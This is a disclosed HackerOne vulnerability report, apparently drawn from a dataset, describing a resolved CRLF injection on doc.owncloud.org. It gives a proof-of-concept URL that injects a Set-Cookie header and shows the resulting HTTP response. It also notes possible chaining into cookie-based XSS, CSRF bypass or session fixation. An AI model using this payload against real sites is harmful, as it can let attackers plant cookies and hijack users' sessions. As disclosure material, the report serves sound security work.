---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '154275'
original_report_id: '154275'
title: '[doc.owncloud.org] CRLF Injection'
team_handle: owncloud
created_at: '2016-07-27T08:08:07.446Z'
disclosed_at: '2016-11-02T13:38:30.583Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
---

# [doc.owncloud.org] CRLF Injection

## Metadata

- HackerOne Report ID: 154275
- Weakness: 
- Program: owncloud
- Disclosed At: 2016-11-02T13:38:30.583Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**PoC**:
`http://doc.owncloud.org/%23%0dSet-Cookie:crlf=injection;domain=.owncloud.org;`

**HTTP Response**:
```
HTTP/1.1 301 Moved Permanently\r\n
Date: Wed, 27 Jul 2016 07:58:47 GMT\r\n
Server: Apache\r\n
Location: https://doc.owncloud.org/#\r                      < injection \r
Set-Cookie:crlf=injection;domain=.owncloud.org;\r\n
```

**Result**:
Creating a cookie-param "crlf=injection" on *.owncloud.org

This vulnerability could be used in combination with others. For example, XSS via Cookie, bypass Double Submit Cookie csrf protection or session fixation. HTTP headers delimiter \r (%0d) is supported by any web browser other than FireFox.

HTTP Strict Transport Security can block the attack, if the user has already visited the site doc.owncloud.org.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
